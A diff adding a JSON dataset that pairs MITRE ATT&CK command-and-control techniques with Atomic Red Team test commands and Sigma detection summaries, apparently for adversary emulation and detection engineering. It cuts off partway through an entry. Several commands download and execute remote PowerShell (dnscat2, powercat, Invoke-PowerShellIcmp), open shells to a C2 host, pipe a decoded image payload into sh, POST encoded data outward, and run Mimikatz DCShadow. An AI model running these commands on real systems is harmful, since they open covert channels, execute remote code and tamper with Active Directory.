@@ -1,0 +1,883 @@
+{
+  "tactic_id": "TA0011",
+  "tactic_name": "command_and_control",
+  "techniques": [
+    {
+      "technique_id": "T1001.002",
+      "name": "Data Obfuscation via Steganography",
+      "description": "This atomic test, named \"Steganographic Tarball Embedding\", simulates the technique of data obfuscation via steganography by embedding a tar archive file (tarball) \nwithin an image.\n\nThe test begins by ensuring the availability of the image file and the tarball file containing data . It then generates random passwords and saves them to a \nfile. Subsequently, the tarball file is created, containing the passwords file. The test executor command reads the contents of the image \nfile and the tarball file as byte arrays and appends them together to form a new image file. This process effectively embeds the tarball \nfile within the image, utilizing steganography techniques for data obfuscation.\n\nThis atomic test simulates the technique of data obfuscation via steganography, enabling attackers to clandestinely transfer files across systems undetected. \nBy embedding the tarball file within the image, adversaries can obscure their activities, facilitating covert communication and data exfiltration.",
+      "platforms": [
+        "windows",
+        "linux"
+      ],
+      "commands": [
+        {
+          "executor": "powershell",
+          "command": "Get-Content \"#{image_file}\", \"#{tar_file}\" -Encoding byte -ReadCount 0 | Set-Content \"#{new_image_file}\" -Encoding byte",
+          "cleanup": "Set-ExecutionPolicy Bypass -Scope Process -Force -ErrorAction Ignore\nRemove-Item -Path \"#{new_image_file}\" -Force -ErrorAction Ignore"
+        },
+        {
+          "executor": "powershell",
+          "command": "cd \"PathToAtomicsFolder\\ExternalPayloads\\\"\nImport-Module .\\Extract-Invoke-PSImage.ps1\n$extractedScript=Extract-Invoke-PSImage -Image \"#{image_file}\" -Out \"$HOME\\result.ps1\"\n$scriptContent = Get-Content \"$HOME\\result.ps1\" -Raw\n$base64Pattern = \"(?<=^|[^A-Za-z0-9+/])(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}(==)?|[A-Za-z0-9+/]{3}=)?(?=$|[^A-Za-z0-9+/])\"\n$base64Strings = [regex]::Matches($scriptContent, $base64Pattern) | ForEach-Object { $_.Value }\n$base64Strings | Set-Content \"$HOME\\decoded.ps1\"\n$decodedContent = Get-Content \"$HOME\\decoded.ps1\" -Raw\n$decodedText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($decodedContent))\n$textPattern = '^.+'  \n$textMatches = [regex]::Matches($decodedText, $textPattern) | ForEach-Object { $_.Value }\n$scriptPath = \"$HOME\\textExtraction.ps1\"\n$textMatches -join '' | Set-Content -Path $scriptPath\n. \"$HOME\\textExtraction.ps1\"",
+          "cleanup": "Set-ExecutionPolicy Bypass -Scope Process -Force -ErrorAction Ignore\nRemove-Item -Path \"$HOME\\result.ps1\" -Force -ErrorAction Ignore \nRemove-Item -Path \"$HOME\\textExtraction.ps1\" -Force -ErrorAction Ignore\nRemove-Item -Path \"$HOME\\decoded.ps1\" -Force -ErrorAction Ignore"
+        },
+        {
+          "executor": "sh",
+          "command": "cat \"#{script}\" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat \"#{image}\" - > \"#{evil_image}\"; strings \"#{evil_image}\" | tail -n 1 | base64 -d | sh",
+          "cleanup": "rm \"#{evil_image}\""
+        }
+      ],
+      "detection_rules": []
+    },
+    {
+      "technique_id": "T1001.003",
+      "name": "T1001.003",
+      "description": "",
+      "platforms": [],
+      "commands": [],
+      "detection_rules": [
+        {
+          "title": "Suspicious LDAP-Attributes Used",
+          "logsource": {
+            "product": "windows",
+            "service": "security",
+            "definition": "The \"Audit Directory Service Changes\" logging policy must be configured in order to receive events. Audit events are generated only for objects with configured system access control lists (SACLs). Audit events are generated only for objects with configured system access control lists (SACLs) and only when accessed in a manner that matches their SACL settings. This policy covers the following events ids - 5136, 5137, 5138, 5139, 5141. Note that the default policy does not cover User objects. For that a custom AuditRule need to be setup (See https://github.com/OTRF/Set-AuditRule)"
+          },
+          "description": "Detects the usage of particular AttributeLDAPDisplayNames, which are known for data exchange via LDAP by the tool LDAPFragger and are additionally not commonly used in companies."
+        },
+        {
+          "title": "ADSI-Cache File Creation By Uncommon Tool",
+          "logsource": {
+            "product": "windows",
+            "category": "file_event"
+          },
+          "description": "Detects the creation of an \"Active Directory Schema Cache File\" (.sch) file by an uncommon tool."
+        }
+      ]
+    },
+    {
+      "technique_id": "T1071",
+      "name": "Application Layer Protocol",
+      "description": "An adversary may establish Telnet communication from a compromised endpoint to a command and control (C2) server in order to carry out additional attacks on objectives.",
+      "platforms": [
+        "windows"
+      ],
+      "commands": [
+        {
+          "executor": "powershell",
+          "command": "#{client_path} #{server_ip} --port #{server_port}",
+          "cleanup": null
+        }
+      ],
+      "detection_rules": [
+        {
+          "title": "HackTool - SILENTTRINITY Stager DLL Load",
+          "logsource": {
+            "category": "image_load",
+            "product": "windows"
+          },
+          "description": "Detects SILENTTRINITY stager dll loading activity"
+        },
+        {
+          "title": "Github Self-Hosted Runner Execution",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects GitHub self-hosted runners executing workflows on local infrastructure that could be abused for persistence and code execution.\nShai-Hulud is an npm supply chain worm targeting CI/CD environments.\nIt installs runners on compromised systems to maintain access after credential theft, leveraging their access to secrets and internal networks."
+        },
+        {
+          "title": "HackTool - SILENTTRINITY Stager Execution",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects SILENTTRINITY stager use via PE metadata"
+        },
+        {
+          "title": "Potentially Suspicious Rundll32.EXE Execution of UDL File",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects the execution of rundll32.exe with the oledb32.dll library to open a UDL file.\nThreat actors can abuse this technique as a phishing vector to capture authentication credentials or other sensitive data."
+        }
+      ]
+    },
+    {
+      "technique_id": "T1071.001",
+      "name": "Application Layer Protocol: Web Protocols",
+      "description": "This test simulates an infected host beaconing to command and control. Upon execution, no output will be displayed. \nUse an application such as Wireshark to record the session and observe user agent strings and responses.\n\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat",
+      "platforms": [
+        "windows",
+        "linux",
+        "macos",
+        "darwin"
+      ],
+      "commands": [
+        {
+          "executor": "powershell",
+          "command": "Invoke-WebRequest #{domain} -UserAgent \"HttpBrowser/1.0\" | out-null\nInvoke-WebRequest #{domain} -UserAgent \"Wget/1.9+cvs-stable (Red Hat modified)\" | out-null\nInvoke-WebRequest #{domain} -UserAgent \"Opera/8.81 (Windows NT 6.0; U; en)\" | out-null\nInvoke-WebRequest #{domain} -UserAgent \"*<|>*\" | out-null",
+          "cleanup": null
+        },
+        {
+          "executor": "command_prompt",
+          "command": "#{curl_path} -s -A \"HttpBrowser/1.0\" -m3 #{domain} >nul 2>&1\n#{curl_path} -s -A \"Wget/1.9+cvs-stable (Red Hat modified)\" -m3 #{domain} >nul 2>&1\n#{curl_path} -s -A \"Opera/8.81 (Windows NT 6.0; U; en)\" -m3 #{domain} >nul 2>&1\n#{curl_path} -s -A \"*<|>*\" -m3 #{domain} >nul 2>&1",
+          "cleanup": null
+        },
+        {
+          "executor": "sh",
+          "command": "curl -s -A \"HttpBrowser/1.0\" -m3 #{domain}\ncurl -s -A \"Wget/1.9+cvs-stable (Red Hat modified)\" -m3 #{domain}\ncurl -s -A \"Opera/8.81 (Windows NT 6.0; U; en)\" -m3 #{domain}\ncurl -s -A \"*<|>*\" -m3 #{domain}",
+          "cleanup": null
+        },
+        {
+          "executor": "sh",
+          "command": "server=\"#{app.contact.http}\";\ncurl -s -X POST -H \"file:ragdoll.py\" -H \"platform:darwin\" $server/file/download > ragdoll.py;\npip install requests beautifulsoup4;\npython ragdoll.py -W $server#{app.contact.html}",
+          "cleanup": "pkill -f ragdoll"
+        },
+        {
+          "executor": "sh",
+          "command": "server=\"#{app.contact.http}\";\ncurl -s -X POST -H \"file:ragdoll.py\" -H \"platform:linux\" $server/file/download > ragdoll.py;\npip install requests beautifulsoup4;\npython ragdoll.py -W $server#{app.contact.html}",
+          "cleanup": "pkill -f ragdoll"
+        }
+      ],
+      "detection_rules": [
+        {
+          "title": "Cloudflared Tunnels Related DNS Requests",
+          "logsource": {
+            "category": "dns_query",
+            "product": "windows"
+          },
+          "description": "Detects DNS requests to Cloudflared tunnels domains.\nAttackers can abuse that feature to establish a reverse shell or persistence on a machine."
+        },
+        {
+          "title": "DNS Query To Devtunnels Domain",
+          "logsource": {
+            "category": "dns_query",
+            "product": "windows"
+          },
+          "description": "Detects DNS query requests to Devtunnels domains. Attackers can abuse that feature to establish a reverse shell or persistence on a machine."
+        },
+        {
+          "title": "DNS Query Request By QuickAssist.EXE",
+          "logsource": {
+            "category": "dns_query",
+            "product": "windows"
+          },
+          "description": "Detects DNS queries initiated by \"QuickAssist.exe\" to Microsoft Quick Assist primary endpoint that is used to establish a session."
+        },
+        {
+          "title": "DNS Query To Visual Studio Code Tunnels Domain",
+          "logsource": {
+            "product": "windows",
+            "category": "dns_query"
+          },
+          "description": "Detects DNS query requests to Visual Studio Code tunnel domains. Attackers can abuse that feature to establish a reverse shell or persistence on a machine."
+        },
+        {
+          "title": "Outbound Network Connection Initiated By Microsoft Dialer",
+          "logsource": {
+            "category": "network_connection",
+            "product": "windows"
+          },
+          "description": "Detects outbound network connection initiated by Microsoft Dialer.\nThe Microsoft Dialer, also known as Phone Dialer, is a built-in utility application included in various versions of the Microsoft Windows operating system. Its primary function is to provide users with a graphical interface for managing phone calls via a modem or a phone line connected to the computer.\nThis is an outdated process in the current conext of it's usage and is a common target for info stealers for process injection, and is used to make C2 connections, common example is \"Rhadamanthys\""
+        },
+        {
+          "title": "Change User Agents with WebRequest",
+          "logsource": {
+            "product": "windows",
+            "category": "ps_script",
+            "definition": "Requirements: Script Block Logging must be enabled"
+          },
+          "description": "Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic.\nCommands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server."
+        },
+        {
+          "title": "Visual Studio Code Tunnel Execution",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects Visual Studio Code tunnel execution. Attackers can abuse this functionality to establish a C2 channel"
+        },
+        {
+          "title": "Visual Studio Code Tunnel Shell Execution",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects the execution of a shell (powershell, bash, wsl...) via Visual Studio Code tunnel. Attackers can abuse this functionality to establish a C2 channel and execute arbitrary commands on the system."
+        },
+        {
+          "title": "Renamed Visual Studio Code Tunnel Execution",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects renamed Visual Studio Code tunnel execution. Attackers can abuse this functionality to establish a C2 channel"
+        },
+        {
+          "title": "Visual Studio Code Tunnel Service Installation",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects the installation of VsCode tunnel (code-tunnel) as a service."
+        }
+      ]
+    },
+    {
+      "technique_id": "T1071.004",
+      "name": "Application Layer Protocol: DNS",
+      "description": "This test simulates an infected host sending a large volume of DNS queries to a command and control server.\nThe intent of this test is to trigger threshold based detection on the number of DNS queries either from a single source system or to a single targe domain.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.",
+      "platforms": [
+        "windows"
+      ],
+      "commands": [
+        {
+          "executor": "powershell",
+          "command": "for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type \"#{query_type}\" \"#{subdomain}-$(Get-Random -Minimum 1 -Maximum 999999).#{domain}\" -QuickTimeout}",
+          "cleanup": null
+        },
+        {
+          "executor": "powershell",
+          "command": "Set-Location \"PathToAtomicsFolder\"\n.\\T1071.004\\src\\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}",
+          "cleanup": null
+        },
+        {
+          "executor": "powershell",
+          "command": "Set-Location \"PathToAtomicsFolder\"\n.\\T1071.004\\src\\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}",
+          "cleanup": null
+        },
+        {
+          "executor": "powershell",
+          "command": "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')\nStart-Dnscat2 -Domain #{domain} -DNSServer #{server_ip}",
+          "cleanup": null
+        }
+      ],
+      "detection_rules": [
+        {
+          "title": "Suspicious Cobalt Strike DNS Beaconing - DNS Client",
+          "logsource": {
+            "product": "windows",
+            "service": "dns-client",
+            "definition": "Requirements: Microsoft-Windows-DNS Client Events/Operational Event Log must be enabled/collected in order to receive the events."
+          },
+          "description": "Detects a program that invoked suspicious DNS queries known from Cobalt Strike beacons"
+        },
+        {
+          "title": "DNS Query To Common Malware Hosting and Shortener Services",
+          "logsource": {
+            "product": "windows",
+            "category": "dns_query"
+          },
+          "description": "Detects DNS queries to domains commonly used by threat actors to host malware payloads or redirect through URL shorteners.\nThese include platforms like Cloudflare Workers, TryCloudflare, InfinityFree, and URL shorteners such as tinyurl and lihi.cc.\nSuch DNS activity can indicate potential delivery or command-and-control communication attempts."
+        },
+        {
+          "title": "DNS Query by Finger Utility",
+          "logsource": {
+            "product": "windows",
+            "category": "dns_query"
+          },
+          "description": "Detects DNS queries made by the finger utility, which can be abused by threat actors to retrieve remote commands for execution on Windows devices.\nIn one ClickFix malware campaign, adversaries leveraged the finger protocol to fetch commands from a remote server.\nSince the finger utility is not commonly used in modern Windows environments, its presence already raises suspicion.\nInvestigating such DNS queries can also help identify potential malicious infrastructure used by threat actors for command and control (C2) communication."
+        },
+        {
+          "title": "Suspicious Cobalt Strike DNS Beaconing - Sysmon",
+          "logsource": {
+            "product": "windows",
+            "category": "dns_query"
+          },
+          "description": "Detects a program that invoked suspicious DNS queries known from Cobalt Strike beacons"
+        },
+        {
+          "title": "Network Connection Initiated via Finger.EXE",
+          "logsource": {
+            "category": "network_connection",
+            "product": "windows"
+          },
+          "description": "Detects network connections via finger.exe, which can be abused by threat actors to retrieve remote commands for execution on Windows devices.\nIn one ClickFix malware campaign, adversaries leveraged the finger protocol to fetch commands from a remote server.\nSince the finger utility is not commonly used in modern Windows environments, its presence already raises suspicion.\nInvestigating such network connections can also help identify potential malicious infrastructure used by threat actors"
+        },
+        {
+          "title": "Silence.EDA Detection",
+          "logsource": {
+            "product": "windows",
+            "category": "ps_script",
+            "definition": "Requirements: Script Block Logging must be enabled"
+          },
+          "description": "Detects Silence EmpireDNSAgent as described in the Group-IP report"
+        },
+        {
+          "title": "DNS Exfiltration and Tunneling Tools Execution",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Well-known DNS Exfiltration tools execution"
+        }
+      ]
+    },
+    {
+      "technique_id": "T1090",
+      "name": "T1090",
+      "description": "",
+      "platforms": [],
+      "commands": [],
+      "detection_rules": [
+        {
+          "title": "Ngrok Usage with Remote Desktop Service",
+          "logsource": {
+            "product": "windows",
+            "service": "terminalservices-localsessionmanager"
+          },
+          "description": "Detects cases in which ngrok, a reverse proxy tool, forwards events to the local RDP port, which could be a sign of malicious behaviour"
+        },
+        {
+          "title": "Communication To LocaltoNet Tunneling Service Initiated",
+          "logsource": {
+            "category": "network_connection",
+            "product": "windows"
+          },
+          "description": "Detects an executable initiating a network connection to \"LocaltoNet\" tunneling sub-domains.\nLocaltoNet is a reverse proxy that enables localhost services to be exposed to the Internet.\nAttackers have been seen to use this service for command-and-control activities to bypass MFA and perimeter controls."
+        },
+        {
+          "title": "Communication To Ngrok Tunneling Service Initiated",
+          "logsource": {
+            "category": "network_connection",
+            "product": "windows"
+          },
+          "description": "Detects an executable initiating a network connection to \"ngrok\" tunneling domains.\nAttackers were seen using this \"ngrok\" in order to store their second stage payloads and malware.\nWhile communication with such domains can be legitimate, often times is a sign of either data exfiltration by malicious actors or additional download."
+        },
+        {
+          "title": "Suspicious TCP Tunnel Via PowerShell Script",
+          "logsource": {
+            "product": "windows",
+            "category": "ps_script",
+            "definition": "Requirements: Script Block Logging must be enabled"
+          },
+          "description": "Detects powershell scripts that creates sockets/listeners which could be indicative of tunneling activity"
+        },
+        {
+          "title": "Cloudflared Tunnel Connections Cleanup",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects execution of the \"cloudflared\" tool with the tunnel \"cleanup\" flag in order to cleanup tunnel connections."
+        },
+        {
+          "title": "Cloudflared Tunnel Execution",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects execution of the \"cloudflared\" tool to connect back to a tunnel. This was seen used by threat actors to maintain persistence and remote access to compromised networks."
+        },
+        {
+          "title": "HackTool - Htran/NATBypass Execution",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects executable names or flags used by Htran or Htran-like tools (e.g. NATBypass)"
+        },
+        {
+          "title": "New Port Forwarding Rule Added Via Netsh.EXE",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects the execution of netsh commands that configure a new port forwarding (PortProxy) rule"
+        },
+        {
+          "title": "RDP Port Forwarding Rule Added Via Netsh.EXE",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects the execution of netsh to configure a port forwarding of port 3389 (RDP) rule"
+        },
+        {
+          "title": "PUA - Fast Reverse Proxy (FRP) Execution",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects the use of Fast Reverse Proxy. frp is a fast reverse proxy to help you expose a local server behind a NAT or firewall to the Internet."
+        },
+        {
+          "title": "PUA- IOX Tunneling Tool Execution",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects the use of IOX - a tool for port forwarding and intranet proxy purposes"
+        },
+        {
+          "title": "PUA - NPS Tunneling Tool Execution",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects the use of NPS, a port forwarding and intranet penetration proxy server"
+        },
+        {
+          "title": "Potentially Suspicious Usage Of Qemu",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects potentially suspicious execution of the Qemu utility in a Windows environment.\nThreat actors have leveraged this utility and this technique for achieving network access as reported by Kaspersky."
+        },
+        {
+          "title": "New PortProxy Registry Entry Added",
+          "logsource": {
+            "category": "registry_event",
+            "product": "windows"
+          },
+          "description": "Detects the modification of the PortProxy registry key which is used for port forwarding."
+        }
+      ]
+    },
+    {
+      "technique_id": "T1090.001",
+      "name": "Proxy: Internal Proxy",
+      "description": "Enable traffic redirection.\n\nNote that this test may conflict with pre-existing system configuration.",
+      "platforms": [
+        "linux",
+        "macos",
+        "windows"
+      ],
+      "commands": [
+        {
+          "executor": "sh",
+          "command": "export #{proxy_scheme}_proxy=#{proxy_server}:#{proxy_port}\ncurl #{test_url}",
+          "cleanup": "unset #{proxy_scheme}_proxy\n[ \"#{run_squid}\" == \"true\" ] && (kill -9 $(ps aux | grep \"squid -N\" | grep -v \"grep\" | awk '{print $2}'))"
+        },
+        {
+          "executor": "sh",
+          "command": "networksetup -setwebproxy #{interface} #{proxy_server} #{proxy_port}\nnetworksetup -setsecurewebproxy #{interface} #{proxy_server} #{proxy_port}",
+          "cleanup": "networksetup -setwebproxystate #{interface} off\nnetworksetup -setsecurewebproxystate #{interface} off"
+        },
+        {
+          "executor": "powershell",
+          "command": "netsh interface portproxy add v4tov4 listenport=#{listenport} connectport=#{connectport} connectaddress=#{connectaddress}",
+          "cleanup": "netsh interface portproxy delete v4tov4 listenport=#{listenport} -ErrorAction Ignore | Out-Null"
+        }
+      ],
+      "detection_rules": [
+        {
+          "title": "RDP over Reverse SSH Tunnel WFP",
+          "logsource": {
+            "product": "windows",
+            "service": "security"
+          },
+          "description": "Detects svchost hosting RDP termsvcs communicating with the loopback address"
+        },
+        {
+          "title": "Cloudflared Portable Execution",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects the execution of the \"cloudflared\" binary from a non standard location."
+        },
+        {
+          "title": "Cloudflared Quick Tunnel Execution",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects creation of an ad-hoc Cloudflare Quick Tunnel, which can be used to tunnel local services such as HTTP, RDP, SSH and SMB.\nThe free TryCloudflare Quick Tunnel will generate a random subdomain on trycloudflare[.]com, following a call to api[.]trycloudflare[.]com.\nThe tool has been observed in use by threat groups including Akira ransomware."
+        },
+        {
+          "title": "HackTool - SharpChisel Execution",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects usage of the Sharp Chisel via the commandline arguments"
+        },
+        {
+          "title": "PUA - Chisel Tunneling Tool Execution",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects usage of the Chisel tunneling tool via the commandline arguments"
+        },
+        {
+          "title": "Renamed Cloudflared.EXE Execution",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects the execution of a renamed \"cloudflared\" binary."
+        }
+      ]
+    },
+    {
+      "technique_id": "T1090.002",
+      "name": "T1090.002",
+      "description": "",
+      "platforms": [],
+      "commands": [],
+      "detection_rules": [
+        {
+          "title": "RDP over Reverse SSH Tunnel WFP",
+          "logsource": {
+            "product": "windows",
+            "service": "security"
+          },
+          "description": "Detects svchost hosting RDP termsvcs communicating with the loopback address"
+        },
+        {
+          "title": "Network Communication Initiated To Portmap.IO Domain",
+          "logsource": {
+            "category": "network_connection",
+            "product": "windows"
+          },
+          "description": "Detects an executable accessing the portmap.io domain, which could be a sign of forbidden C2 traffic or data exfiltration by malicious actors"
+        }
+      ]
+    },
+    {
+      "technique_id": "T1090.003",
+      "name": "Proxy: Multi-hop Proxy",
+      "description": "Psiphon 3 is a circumvention tool from Psiphon Inc. that utilizes VPN, SSH and HTTP Proxy technology to provide you\nwith uncensored access to Internet.\nThis process will launch Psiphon 3 and establish a connection. Shortly after it will be shut down via process kill commands.\nMore information can be found about Psiphon using the following urls\nhttp://s3.amazonaws.com/0ubz-2q11-gi9y/en.html\nhttps://psiphon.ca/faq.html",
+      "platforms": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "commands": [
+        {
+          "executor": "powershell",
+          "command": "& \"PathToAtomicsFolder\\T1090.003\\src\\Psiphon.bat\"",
+          "cleanup": "$Proxy = Get-Content $env:Temp\\proxy-backup.txt -ErrorAction Ignore\nif($null -ne $Proxy) \n{Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings' -Name \"ProxyServer\" -Value $Proxy}"
+        },
+        {
+          "executor": "powershell",
+          "command": "invoke-expression 'cmd /c start powershell -Command {cmd /c \"#{TorExe}\"}'\nsleep -s 60\nstop-process -name \"tor\" | out-null",
+          "cleanup": null
+        },
+        {
+          "executor": "sh",
+          "command": "[ \"$(uname)\" = 'FreeBSD' ] && sysrc tor_enable=\"YES\" && service tor start || sudo systemctl start tor",
+          "cleanup": "[ \"$(uname)\" = 'FreeBSD' ] && service tor stop && sysrc -x tor_enable || sudo systemctl stop tor"
+        },
+        {
+          "executor": "sh",
+          "command": "osascript -e 'tell application \"Terminal\" to do script \"tor\"'",
+          "cleanup": "killall tor > /dev/null 2>&1"
+        }
+      ],
+      "detection_rules": [
+        {
+          "title": "Query Tor Onion Address - DNS Client",
+          "logsource": {
+            "product": "windows",
+            "service": "dns-client",
+            "definition": "Requirements: Microsoft-Windows-DNS Client Events/Operational Event Log must be enabled/collected in order to receive the events."
+          },
+          "description": "Detects DNS resolution of an .onion address related to Tor routing networks"
+        },
+        {
+          "title": "DNS Query Tor .Onion Address - Sysmon",
+          "logsource": {
+            "product": "windows",
+            "category": "dns_query"
+          },
+          "description": "Detects DNS queries to an \".onion\" address related to Tor routing networks"
+        },
+        {
+          "title": "Tor Client/Browser Execution",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects the use of Tor or Tor-Browser to connect to onion routing networks"
+        }
+      ]
+    },
+    {
+      "technique_id": "T1095",
+      "name": "Non-Application Layer Protocol",
+      "description": "This will attempt to  start C2 Session Using ICMP. For information on how to set up the listener\nrefer to the following blog: https://www.blackhillsinfosec.com/how-to-c2-over-icmp/",
+      "platforms": [
+        "windows",
+        "linux"
+      ],
+      "commands": [
+        {
+          "executor": "powershell",
+          "command": "IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')\nInvoke-PowerShellIcmp -IPAddress #{server_ip}",
+          "cleanup": null
+        },
+        {
+          "executor": "powershell",
+          "command": "cmd /c \"#{ncat_exe}\" #{server_ip} #{server_port}",
+          "cleanup": null
+        },
+        {
+          "executor": "powershell",
+          "command": "IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')\npowercat -c #{server_ip} -p #{server_port}",
+          "cleanup": null
+        }
+      ],
+      "detection_rules": [
+        {
+          "title": "Netcat The Powershell Version",
+          "logsource": {
+            "product": "windows",
+            "category": "ps_classic_start"
+          },
+          "description": "Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network"
+        },
+        {
+          "title": "PUA - Netcat Suspicious Execution",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects execution of Netcat. Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network"
+        }
+      ]
+    },
+    {
+      "technique_id": "T1132.001",
+      "name": "Data Encoding: Standard Encoding",
+      "description": "Utilizing a common technique for posting base64 encoded data.",
+      "platforms": [
+        "macos",
+        "linux",
+        "windows"
+      ],
+      "commands": [
+        {
+          "executor": "sh",
+          "command": "echo -n 111-11-1111 | base64\ncurl -XPOST #{base64_data}.#{destination_url}",
+          "cleanup": null
+        },
+        {
+          "executor": "sh",
+          "command": "echo -n 111-11-1111 | b64encode -r -\ncurl -XPOST #{base64_data}.#{destination_url}",
+          "cleanup": null
+        },
+        {
+          "executor": "powershell",
+          "command": "$plaintext = ([system.Text.Encoding]::UTF8.getBytes(\"#{plaintext}\"))\n$key = \"#{key}\"\n$cyphertext =  @();\nfor ($i = 0; $i -lt $plaintext.Count; $i++) {\n $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];\n}\n$cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext)\n[System.Net.ServicePointManager]::Expect100Continue = $false\nInvoke-WebRequest -Uri #{destination_url} -Method POST -Body $cyphertext -DisableKeepAlive",
+          "cleanup": null
+        }
+      ],
+      "detection_rules": [
+        {
+          "title": "Suspicious FromBase64String Usage On Gzip Archive - Ps Script",
+          "logsource": {
+            "product": "windows",
+            "category": "ps_script",
+            "definition": "Requirements: Script Block Logging must be enabled"
+          },
+          "description": "Detects attempts of decoding a base64 Gzip archive in a PowerShell script. This technique is often used as a method to load malicious content into memory afterward."
+        },
+        {
+          "title": "DNS Exfiltration and Tunneling Tools Execution",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Well-known DNS Exfiltration tools execution"
+        },
+        {
+          "title": "Gzip Archive Decode Via PowerShell",
+          "logsource": {
+            "product": "windows",
+            "category": "process_creation"
+          },
+          "description": "Detects attempts of decoding encoded Gzip archives via PowerShell."
+        },
+        {
+          "title": "Suspicious FromBase64String Usage On Gzip Archive - Process Creation",
+          "logsource": {
+            "product": "windows",
+            "category": "process_creation"
+          },
+          "description": "Detects attempts of decoding a base64 Gzip archive via PowerShell. This technique is often used as a method to load malicious content into memory afterward."
+        }
+      ]
+    },
+    {
+      "technique_id": "T1207",
+      "name": "Rogue Domain Controller",
+      "description": "Use Mimikatz DCShadow method to simulate behavior of an Active Directory Domain Controller and edit protected attribute.\n\n[DCShadow](https://www.dcshadow.com/)\n[Additional Reference](http://www.labofapenetrationtester.com/2018/04/dcshadow.html)\n\nIt will set the badPwdCount attribute of the target user (user/machine account) to 9999. You can check after with:\nGet-ADObject -LDAPFilter '(samaccountname=<user>)' -Properties badpwdcount | select-object -ExpandProperty badpwdcount\n\nNeed SYSTEM privileges locally (automatically obtained via PsExec, so running as admin is sufficient), and Domain Admin remotely.\nThe easiest is to run elevated and as a Domain Admin user.",
+      "platforms": [
+        "windows"
+      ],
+      "commands": [
+        {
+          "executor": "powershell",
+          "command": "# starting fake DC server, as SYSTEM (required)\n$dc_output_file = \"PathToAtomicsFolder\\..\\ExternalPayloads\\art-T1207-mimikatz-DC.log\"\nRemove-Item $dc_output_file -ErrorAction Ignore\n$mimikatzParam =\"`\"log $dc_output_file`\" `\"lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`\" `\"exit`\"\"\n$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList \"/c '#{psexec_path}' /accepteula -d -s #{mimikatz_path} $mimikatzParam\"\n\n# wait for fake DC server to be ready...\nStart-Sleep -Seconds 5\n\n# server ready, so trigger replication (push) and wait until it finished\n& \"#{mimikatz_path}\" \"lsadump::dcshadow /push\" \"exit\"\n\nWrite-Host \"`nWaiting for fake DC server to return\"\nWait-Process $dc\n\nWrite-Host \"`nOutput from fake DC server:\"\nGet-Content $dc_output_file\nStart-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it\nRemove-Item $dc_output_file -ErrorAction Ignore\n\nWrite-Host \"End of DCShadow\"",
+          "cleanup": "Stop-Process -Name \"mimikatz\" -Force -ErrorAction Ignore"
+        }
+      ],
+      "detection_rules": [
+        {
